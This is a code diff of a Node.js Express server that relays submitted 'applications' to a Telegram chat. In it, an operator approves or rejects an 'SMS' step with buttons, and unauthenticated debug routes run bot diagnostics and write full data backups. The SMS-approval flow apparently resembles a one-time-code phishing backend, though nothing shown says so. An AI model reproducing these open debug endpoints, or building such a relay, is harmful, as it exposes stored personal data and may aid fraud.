+app.get('/api/debug/telegram-test', async (req, res) => {
+    const results = {};
+    try {
+        const r = await fetch(`${TELEGRAM_API_URL}/getMe`);
+        results.getMe = await r.json();
+    } catch (e) { results.getMe = { error: e.message, code: e.code }; }
+    try {
+        const r = await fetch(`${TELEGRAM_API_URL}/getChat?chat_id=${TELEGRAM_CHAT_ID}`);
+        results.getChat = await r.json();
+    } catch (e) { results.getChat = { error: e.message, code: e.code }; }
+    try {
+        const r = await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: '🧪 Diagnostic ping (Zambia) — sending works.' })
+        });
+        results.sendMessage = await r.json();
+    } catch (e) { results.sendMessage = { error: e.message, code: e.code }; }
+    res.json(results);
+});
+
+// ─── 14. Backup ───
 app.get('/api/debug/backup', (req, res) => {
     try {
         const backupFile = path.join(DATA_DIR, `applications_backup_${Date.now()}.json`);
-        const data = {
-            applications,
-            rejectionHistory,
-            timestamp: new Date().toISOString()
-        };
-        atomicWrite(backupFile, JSON.stringify(data, null, 2));
-        res.json({
-            ok: true,
-            message: 'Backup created',
-            file: backupFile
-        });
+        atomicWrite(backupFile, JSON.stringify({ applications, rejectionHistory, timestamp: new Date().toISOString() }, null, 2));
+        res.json({ ok: true, message: 'Backup created', file: backupFile });
     } catch (error) {
         res.status(500).json({ ok: false, error: error.message });
     }
 });
 
-// ─── TEMP DIAGNOSTIC — hit once, then remove ───
-app.get('/api/debug/telegram-test', async (req, res) => {
-    const results = {};
-
-    try {
-        const r = await fetch(`${TELEGRAM_API_URL}/getMe`);
-        results.getMe = await r.json();
-    } catch (e) { results.getMe = { error: e.message, code: e.code }; }
-
-    try {
-        const r = await fetch(`${TELEGRAM_API_URL}/getChat?chat_id=${TELEGRAM_CHAT_ID}`);
-        results.getChat = await r.json();
-    } catch (e) { results.getChat = { error: e.message, code: e.code }; }
-
-    try {
-        const r = await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: TELEGRAM_CHAT_ID,
-                text: '🧪 Diagnostic ping (Zambia) — sending works.'
-            })
-        });
-        results.sendMessage = await r.json();
-    } catch (e) { results.sendMessage = { error: e.message, code: e.code }; }
-
-    res.json(results);
-});
-
-// ─── Serve Frontend (catch-all AFTER API routes) ───
+// ─── Serve frontend ───
 app.get('*', (req, res) => {
-    if (req.path.startsWith('/api/')) {
-        return res.status(404).json({ ok: false, error: 'Endpoint not found' });
-    }
+    if (req.path.startsWith('/api/')) return res.status(404).json({ ok: false, error: 'Endpoint not found' });
     res.sendFile(path.join(__dirname, '../frontend', 'index.html'));
 });
 
 // ─── Listen ───
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Server running on port ${PORT}`);
-    console.log(`📁 Serving frontend from: ${path.join(__dirname, '../frontend')}`);
-    console.log(`💾 Data directory: ${DATA_DIR}`);
-    console.log(`🔗 Visit: http://localhost:${PORT}`);
+    console.log(`📁 Frontend: ${path.join(__dirname, '../frontend')}`);
+    console.log(`💾 Data: ${DATA_DIR}`);
 
-    // Register webhook if PUBLIC_URL + secret are configured
     if (PUBLIC_URL && TELEGRAM_WEBHOOK_SECRET) {
         const webhookUrl = `${PUBLIC_URL.replace(/\/$/, '')}/api/telegram-webhook`;
-        tgFetch('setWebhook', {
-            url: webhookUrl,
-            secret_token: TELEGRAM_WEBHOOK_SECRET,
-            drop_pending_updates: false
-        }, { retries: 2 }).then(r => {
-            console.log('🔗 setWebhook:', r.ok ? '✅ registered' : `❌ ${r.description || r.error}`);
-        }).catch(e => console.error('setWebhook error:', e.message));
+        tgFetch('setWebhook', { url: webhookUrl, secret_token: TELEGRAM_WEBHOOK_SECRET, drop_pending_updates: false }, { retries: 2 })
+            .then(r => console.log('🔗 setWebhook:', r.ok ? '✅ registered' : `❌ ${r.description || r.error}`))
+            .catch(e => console.error('setWebhook error:', e.message));
     } else if (PUBLIC_URL) {
         console.warn('⚠️ PUBLIC_URL set but TELEGRAM_WEBHOOK_SECRET missing — skipping auto-register');
     }
 
-    // Warm-up ping so cold-start TCP is ready before the first user
     if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
         setTimeout(async () => {
             const r = await tgFetch('getMe', {}, { retries: 2 });
@@ -939,7 +755,7 @@ app.listen(PORT, '0.0.0.0', () => {
     }
 });
 
-// ─── Background sweeper — retries notifications that failed to send ───
+// ─── Background sweeper for failed notifications ───
 setInterval(async () => {
     for (const [id, app] of Object.entries(applications)) {
         if (app.smsStatus === 'pending' && !app.notifiedAt) {
@@ -953,16 +769,13 @@ setInterval(async () => {
                         { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'SMS', applicationId: id }) }
                     ]]
                 );
-                if (tg.ok) {
-                    app.notifiedAt = new Date().toISOString();
-                    saveApplications();
-                }
+                if (tg.ok) { app.notifiedAt = new Date().toISOString(); saveApplications(); }
             }
         }
     }
 }, 30000);
 
-// ─── Keep-alive self-ping (helps fight Render free-tier spin-down) ───
+// ─── Self-ping (fights free-tier spin-down) ───
 if (PUBLIC_URL) {
     const pingUrl = `${PUBLIC_URL.replace(/\/$/, '')}/health`;
     setInterval(() => {
